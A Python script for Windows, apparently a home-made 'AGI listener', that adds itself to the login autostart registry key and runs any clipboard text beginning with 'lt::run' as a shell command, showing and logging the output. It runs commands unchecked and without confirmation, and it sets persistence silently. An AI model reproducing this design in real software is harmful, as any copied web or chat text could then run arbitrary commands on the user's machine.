import time
import subprocess
import os
import sys
import winreg
import ctypes
from threading import Thread

try:
    import pyperclip
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--user", "pyperclip"])
    import pyperclip

AGENT_NAME = "JEMAI_LtListener"
LOGFILE = os.path.expanduser(r"~\jemai_lt_log.txt")

def set_autostart():
    key = winreg.HKEY_CURRENT_USER
    path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    with winreg.OpenKey(key, path, 0, winreg.KEY_SET_VALUE) as reg:
        winreg.SetValueEx(reg, AGENT_NAME, 0, winreg.REG_SZ, f'"{sys.executable}" "{os.path.abspath(__file__)}"')

def show_popup(msg):
    MB_OK = 0x0
    MB_TOPMOST = 0x40000
    ctypes.windll.user32.MessageBoxW(0, msg, "JEMAI AGENT", MB_OK | MB_TOPMOST)

def run_lt_command(command):
    # Remove lt::run and leading/trailing spaces
    code = command[len("lt::run"):].strip()
    if not code:
        return "[ERROR] No command after lt::run."
    try:
        # Run the command, capture output
        result = subprocess.run(code, capture_output=True, shell=True, text=True, timeout=30)
        output = result.stdout.strip() + ("\n" + result.stderr.strip() if result.stderr else "")
        if not output.strip():
            output = "[OK] Command ran, no output."
        # Log
        with open(LOGFILE, "a", encoding="utf-8") as f:
            f.write(f"\n[{time.strftime('%Y-%m-%d %H:%M:%S')}] {code}\n{output}\n{'='*32}\n")
        show_popup(f"Ran: {code}\n\n{output[:4000]}")  # Limit for popups
        return output
    except Exception as ex:
        err = f"[ERROR] {ex}"
        show_popup(err)
        with open(LOGFILE, "a", encoding="utf-8") as f:
            f.write(f"\n[{time.strftime('%Y-%m-%d %H:%M:%S')}] {code}\n{err}\n{'='*32}\n")
        return err

def clipboard_watcher():
    last = ""
    while True:
        try:
            clip = pyperclip.paste()
            if clip != last and isinstance(clip, str):
                if clip.strip().lower().startswith("lt::run"):
                    run_lt_command(clip.strip())
                last = clip
        except Exception as e:
            with open(LOGFILE, "a", encoding="utf-8") as f:
                f.write(f"[Clipboard error] {e}\n")
        time.sleep(0.5)

def main():
    # Ensure autostart at login
    try:
        set_autostart()
    except Exception as e:
        with open(LOGFILE, "a", encoding="utf-8") as f:
            f.write(f"[Autostart error] {e}\n")
    # Start clipboard watcher thread
    Thread(target=clipboard_watcher, daemon=True).start()
    show_popup("JEMAI AGI Listener is active.\n\nCopy any text starting with lt::run to auto-execute it.\n\nLogs at:\n" + LOGFILE)
    while True:
        time.sleep(600)  # Keep alive

if __name__ == "__main__":
    main()
